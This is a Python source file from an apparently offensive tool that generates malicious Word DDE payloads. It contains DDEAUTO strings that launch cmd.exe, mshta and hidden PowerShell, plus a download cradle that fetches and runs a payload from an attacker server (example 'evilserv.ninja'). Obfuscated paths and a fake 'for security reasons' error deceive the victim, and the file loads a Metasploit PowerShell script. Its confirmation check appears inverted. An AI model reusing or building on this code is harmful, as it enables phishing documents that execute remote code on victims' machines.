from utils import *
from utils import __location__

import os

class Payload(object):

	def __init__(self, filetype, server=None, format='Powershell', exploit='empire', filename='None', payload=None, encoding=False):
		self.type = filetype
		self.server = server
		self.format = format		# Supported formats = Powershell & Cmd
		self.exploit = exploit
		self.payload = payload
		self.encoding = encoding
		self.filename = filename

		if self.encoding:
			encoded = '-e'
		else:
			encoded = ''

		# Microsoft Word malstrings
		self.word_malstrings = {
			# Fundamental command execution
			"begin": "DDEAUTO \"C:",
			"obfus": "\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord.exe\\\\..\\\\..\\\\..\\\\..",
			"cmd": "\\\\windows\\\\system32\\\\cmd.exe /k ",
			"psh": "\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe ",
			"mshta": "\\\\windows\\\\system32\\\\mshta.exe ",
			"calc": "{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"}",
			"cmd_psh": "\\\\windows\\\\system32\\\\cmd.exe \"/k powershell.exe ",
			# Powershell strings
			"psh_args": "-nop -sta -noni -w hidden ",
			"psh_enc": "-nop -sta -noni -w hidden -enc ",
			"psh_download": "$z=(new-object system.net.webclient).downloadstring('####');powershell {} $z #".format(encoded)
		}

		self.excel_malstrings = {
			"cmd": "ddeService=&quot;cmd.exe&quot; ddeTopic=&quot;/c ",
			"psh": "ddeService=&quot;powershell.exe&quot; ddeTopic=&quot; ",
			"enc": "-nop -w hidden -enc ",
			"end": "&quot;}"
		}

	def build_custom(self):
		debug("Building a custom payload")
		if self.type == 'docx':
			print(
				"[!] This is a bake your own evil cookies method. You must add the baking mix (psh payload) yourself.\n"
				"\tIf you want to spice it up with encoding/obfuscation, you must do this on your own too.\n"
				"\tLike so...\n"
				"\t calc example|\t Command: \"c:\\\\windows\\\\system32\\\\cmd.exe /k calc.exe\"\n"
				"\t psh example |\t Command: \"c:\\\\windows\\\\system32\\\\cmd.exe /k powershell.exe -nop -sta -NonI -w hidden -c ABCDefgHIJKlmnoPAYLOAD\"\n"
				"\t psh encoded |\t Command: \"c:\\\\windows\\\\system32\\\\cmd.exe /k powershell.exe -nop -sta -NonI -w hidden -enc QUJDRGVmZ0hJSktsbW5vUEFZTE9BRAo=\"\n"
				"\t Error for user to see: \"For Security Reasons\""
			)
			cmd = input("Command: ")
			error = input("Error for user to see: ")
			payload = "{ DDE {0} \"{1}\" }".format(cmd, error)
			if input("Confirm your payload is formatted correctly: [Y/n]").upper() != 'N':
				print("Trying again... Remember, provide ONLY the command and error message you want to insert. We handle the DDE Formatting :)")
				payload = self.build_custom()
			print("[+] Grabbing my bag of magic XML...:\n%s" % payload)
			# print(payload)			# DEBUG
			return payload

	def get_raw_payload(self, method):
		# method refers to the download method from word_malstrings used for pulling the remote payload
		raw = [scrambler(i) for i in self.word_malstrings[method]]
		raw = ''.join(raw)
		raw = raw.replace('####', self.server)
		return raw

	def build(self):
		# debug("Building a web delivery payload")
		if self.type == 'docx':
			msg = input("[?] Would you like to leave a special note on the error message for your friend? [default: \"for security reasons\"]")
			if len(msg) < 1:
				msg = "for security reasons"
			payload = "{begin}{obfus}{psh}{psh_args}{0}\" \"{1}\"".format(self.get_raw_payload('psh_download'), msg, **self.word_malstrings)

			print("[+] Grabbing my bag of magic XML...:")
			print(payload)
			return payload
		else:
			printerr("[-] Sorry, Dearie, but I can't work with those ingredients. Your input file must be a docx! ")
			sys.exit(2)


class Powershell(object):
	def __init__(self, filetype, output_path):
		self.filetype = filetype
		self.outfile = os.path.basename(output_path)

	def custom(self):
		print("[!] A do-it-yourselfer, eh? Alright! Let's get cooking!")
		payload = Payload('docx', filename=self.outfile).build_custom()
		return payload

	def web_delivery(self):
		print("[!] Let's bake some evil cookies!\n")
		print("[*] First, we'll be needing some ingredients!")
		print(
			"|\t First, mix up the powershell payload you want executed on the host with your favorite framework,\n"
			"|\t save it as a text file, and host it on a local web server. Now I just need to know where to find it.")
		uri = input("|\t URI to payload...\n|\t (ex: http://evilserv.ninja/blabbity.txt)\n|\t\t #>:")
		if input("|\t Will you be using an encoded payload? [y/N] #>: ").upper() == 'Y':
			encode = True
		else:
			encode = False

		payload = Payload('docx', uri, encoding=encode, filename=self.outfile).build()
		return payload

############ POWERSHELL PAYLOADS ###############
# Striped down version of Invoke-MetasploitPayload.ps1
with open(os.path.join(__location__, 'powershell/Invoke-MetasploitPayload.ps1')) as magic:
	unicorn_magic = magic